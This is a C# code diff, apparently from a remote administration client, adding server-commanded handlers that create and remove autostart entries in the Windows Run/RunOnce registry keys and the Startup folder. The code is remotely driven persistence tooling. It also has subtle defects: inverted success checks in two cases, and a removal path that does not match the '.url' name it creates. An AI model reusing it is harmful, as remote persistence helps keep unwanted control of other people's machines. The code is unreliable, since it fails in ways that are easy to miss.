@@ -77,11 +77,159 @@ namespace Client.Controllers
             }
             catch (Exception ex)
             {
-                //new SetStatus(string.Format("Getting Autostart Items failed: {0}", ex.Message)).Execute(client);
+                new SetStatus(string.Format("Getting Autostart Items failed: {0}", ex.Message)).Execute(client);
             }
 
         }
 
+        public static void doStartupItemAdd(DoStartupItemAdd packet, ClientMosaic client)
+        {
+            try
+            {
+                switch (packet.type)
+                {
+                    case 0:
+                        if(!addRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", packet.name, packet.path, true))
+                        {
+                            throw new Exception("Coul not add value");
+                        }
+                        break;
+                    case 1:
+                        if (!addRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", packet.name, packet.path, true))
+                        {
+                            throw new Exception("Coul not add value");
+                        }
+                        break;
+                    case 2:
+                        if (!addRegistryKeyValue(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", packet.name, packet.path, true))
+                        {
+                            throw new Exception("Coul not add value");
+                        }
+                        break;
+                    case 3:
+                        if (!addRegistryKeyValue(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", packet.name, packet.path, true))
+                        {
+                            throw new Exception("Coul not add value");
+                        }
+                        break;
+                    case 4:
+                        if (!is64Bit)
+                            throw new NotSupportedException("Only on 64-bit systems supported");
+
+                        if (addRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", packet.name, packet.path, true))
+                        {
+                            throw new Exception("Coul not add value");
+                        }
+                        break;
+                    case 5:
+                        if (!is64Bit)
+                            throw new NotSupportedException("Only on 64-bit systems supported");
+
+                        if (addRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", packet.name, packet.path, true))
+                        {
+                            throw new Exception("Coul not add value");
+                        }
+                        break;
+                    case 6:
+                        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
+                        {
+                            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
+                        }
+
+                        string lnkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup),
+                            packet.name + ".url");
+
+                        using (var writer = new StreamWriter(lnkPath, false))
+                        {
+                            writer.WriteLine("[InternetShortcut]");
+                            writer.WriteLine("URL=file:///" + packet.path);
+                            writer.WriteLine("IconIndex=0");
+                            writer.WriteLine("IconFile=" + packet.path.Replace('\\', '/'));
+                            writer.Flush();
+                        }
+                        break;
+
+                }
+            }
+            catch(Exception ex)
+            {
+                new SetStatus(string.Format("Adding Autostart Item failed: {0}", ex.Message)).Execute(client);
+            }
+        }
+
+        public static void doStartupItemRemove(DoStartupItemRemove packet, ClientMosaic client)
+        {
+            try
+            {
+                switch (packet.type)
+                {
+                    case 0:
+                        if (!deleteRegistryKeyValue(RegistryHive.LocalMachine,
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", packet.name))
+                        {
+                            throw new Exception("Could not remove value");
+                        }
+                        break;
+                    case 1:
+                        if (!deleteRegistryKeyValue(RegistryHive.LocalMachine,
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", packet.name))
+                        {
+                            throw new Exception("Could not remove value");
+                        }
+                        break;
+                    case 2:
+                        if (!deleteRegistryKeyValue(RegistryHive.CurrentUser,
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", packet.name))
+                        {
+                            throw new Exception("Could not remove value");
+                        }
+                        break;
+                    case 3:
+                        if (!deleteRegistryKeyValue(RegistryHive.CurrentUser,
+                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", packet.name))
+                        {
+                            throw new Exception("Could not remove value");
+                        }
+                        break;
+                    case 4:
+                        if (!is64Bit)
+                            throw new NotSupportedException("Only on 64-bit systems supported");
+
+                        if (!deleteRegistryKeyValue(RegistryHive.LocalMachine,
+                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", packet.name))
+                        {
+                            throw new Exception("Could not remove value");
+                        }
+                        break;
+                    case 5:
+                        if (!is64Bit)
+                            throw new NotSupportedException("Only on 64-bit systems supported");
+
+                        if (!deleteRegistryKeyValue(RegistryHive.LocalMachine,
+                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", packet.name))
+                        {
+                            throw new Exception("Could not remove value");
+                        }
+                        break;
+                    case 6:
+                        string startupItemPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), packet.name);
+
+                        if (!File.Exists(startupItemPath))
+                            throw new IOException("File does not exist");
+
+                        File.Delete(startupItemPath);
+                        break;
+                }
+            }
+            catch (Exception ex)
+            {
+                new SetStatus(string.Format("Removing Autostart Item failed: {0}", ex.Message)).Execute(client);
+            }
+        }
+
+        /// :: REGISTRY KEY TOOLS :: ///
+
+        // :: GET :: //
         public static RegistryKey openReadonlySubKey(RegistryHive hive, string path)
         {
             try
@@ -104,11 +252,6 @@ namespace Client.Controllers
             }
         }
 
-        private static bool isNameOrValueNull(this string keyName, RegistryKey key)
-        {
-            return (string.IsNullOrEmpty(keyName) || (key == null));
-        }
-
         public static string getValueSafe(this RegistryKey key, string keyName, string defaultValue = "")
         {
             try
@@ -118,6 +261,62 @@ namespace Client.Controllers
             catch
             {
                 return defaultValue;
+            }
+        }
+        // :: ADD :: //
+        public static bool addRegistryKeyValue(RegistryHive hive, string path, string name, string value, bool addQuotes = false)
+        {
+            try
+            {
+                using (RegistryKey key = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).openWritableSubKeySafe(path))
+                {
+                    if (key == null) return false;
+
+                    if (addQuotes && !value.StartsWith("\"") && !value.EndsWith("\""))
+                        value = "\"" + value + "\"";
+
+                    key.SetValue(name, value);
+                    return true;
+                }
+            }
+            catch (Exception)
+            {
+                return false;
+            }
+        }
+        // :: REMOVE :: //
+        public static bool deleteRegistryKeyValue(RegistryHive hive, string path, string name)
+        {
+            try
+            {
+                using (RegistryKey key = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).openWritableSubKeySafe(path))
+                {
+                    if (key == null) return false;
+                    key.DeleteValue(name, true);
+                    return true;
+                }
+            }
+            catch (Exception)
+            {
+                return false;
+            }
+        }
+
+        // :: TOOLS :: //
+        private static bool isNameOrValueNull(this string keyName, RegistryKey key)
+        {
+            return (string.IsNullOrEmpty(keyName) || (key == null));
+        }
+
+        public static RegistryKey openWritableSubKeySafe(this RegistryKey key, string name)
+        {
+            try
+            {
+                return key.OpenSubKey(name, true);
+            }
+            catch
+            {
+                return null;
             }
         }
     }
